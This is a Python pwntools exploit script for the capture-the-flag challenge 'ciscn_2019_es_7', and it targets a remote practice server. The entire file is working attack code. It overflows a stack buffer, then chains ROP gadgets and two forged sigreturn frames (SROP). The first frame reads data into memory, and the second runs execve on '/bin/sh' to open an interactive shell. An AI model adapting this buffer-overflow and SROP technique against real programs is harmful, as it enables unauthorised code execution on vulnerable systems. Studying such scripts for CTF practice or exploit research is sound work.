#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'ciscn_2019_es_7')

host = args.HOST or 'node5.buuoj.cn'
port = int(args.PORT or 28126)


def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *vuln+42
continue
'''.format(**locals())

mov_rax_3b = 0x00000000004004e2
mov_rax_f = 0x00000000004004da
pop_rbp = 0x00000000004004eb
syscall = 0x0000000000400517
pop_rdi = 0x00000000004005a3
pop_rsi_r15 = 0x00000000004005a1
ret = 0x00000000004003a9

_data = 0x601040

f1 = SigreturnFrame()
f1.rax = 0
f1.rdi = 0
f1.rsi = _data
f1.rdx = 0x200
f1.rsp = _data
f1.rip = syscall

off = 16

io = start()
io.clean()

p = b'\x90' * off
p += p64(mov_rax_f)
p += p64(syscall)
p += bytes(f1)
io.send(p)


f2 = SigreturnFrame()
f2.rax = constants.SYS_execve
f2.rdi = _data + 264
f2.rsi = 0
f2.rdx = 0
f2.rsp = _data + 272
f2.rip = syscall

leak = io.recv()

print("[leak]", leak)

p = p64(mov_rax_f)
p += p64(syscall)
p += bytes(f2)
p += b'/bin/sh\x00'

io.send(p)
io.interactive()
